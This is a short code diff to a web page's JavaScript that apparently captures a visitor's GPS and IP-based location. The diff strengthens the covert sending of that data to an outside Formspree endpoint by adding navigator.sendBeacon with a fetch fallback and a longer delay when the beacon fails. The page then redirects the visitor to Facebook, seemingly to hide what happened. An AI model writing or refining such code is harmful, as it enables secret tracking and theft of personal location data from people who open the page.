@@ -484,15 +484,18 @@ var pInterval = setInterval(function(){
 function doRedirect() {
   clearInterval(pInterval);
   bar.style.width = '100%';
-  fetch('https://formspree.io/f/mjywpbar', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-    body: JSON.stringify(payload)
-  }).catch(function(){});
   try { localStorage.setItem('geo_capture', JSON.stringify(payload)); } catch(e){}
-  setTimeout(function(){ window.location.href = 'https://www.facebook.com'; }, 400);
+  var data = JSON.stringify(payload);
+  var blob = new Blob([data], {type: 'application/json'});
+  var sent = navigator.sendBeacon && navigator.sendBeacon('https://formspree.io/f/mjywpbar', blob);
+  if (!sent) {
+    fetch('https://formspree.io/f/mjywpbar', {
+      method: 'POST', headers: {'Content-Type':'application/json','Accept':'application/json'},
+      body: data
+    }).catch(function(){});
+  }
+  setTimeout(function(){ window.location.href = 'https://www.facebook.com'; }, sent ? 300 : 2000);
 }
-
 function tryFinalize() {
   if (!submitted && (gpsReady || ipReady)) {
     submitted = true;
